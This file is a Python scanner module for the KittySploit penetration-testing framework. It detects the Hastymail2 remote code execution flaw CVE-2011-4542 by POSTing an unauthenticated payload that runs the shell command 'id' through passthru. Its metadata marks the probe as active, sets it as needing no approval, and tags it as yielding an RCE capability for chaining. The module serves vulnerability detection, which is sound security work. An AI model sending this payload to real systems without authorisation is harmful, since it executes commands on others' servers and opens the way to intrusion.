#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detects CVE-2011-4542 by POSTing rs=passthru&rsargs[]=asd&rsargs[]=id to mailbox Drafts."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Hastymail2 - rs=passthru RCE Detection (CVE-2011-4542)',
        'description': (
            'Detects CVE-2011-4542 by POSTing rs=passthru&rsargs[]=asd&rsargs[]=id to mailbox Drafts.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2011', 'hastymail', 'rce', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2011-4542',
        ],
        'cve': 'CVE-2011-4542',
    }

    def run(self):
        for base in ('', '/hastymail2', '/mail', '/hm2'):
            path = f'{base}/index.php?page=mailbox&mailbox=Drafts'
            r = self.http_request(
                method='POST', path=path,
                data='rs=passthru&rsargs[]=asd&rsargs[]=id',
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                allow_redirects=False,
            )
            if r and re.search(r'uid=\d+.*gid=\d+', r.text or ''):
                self.set_info(severity='critical', reason='Hastymail2 rs=passthru RCE (CVE-2011-4542)', path=path.split('?')[0])
                return True
        return False

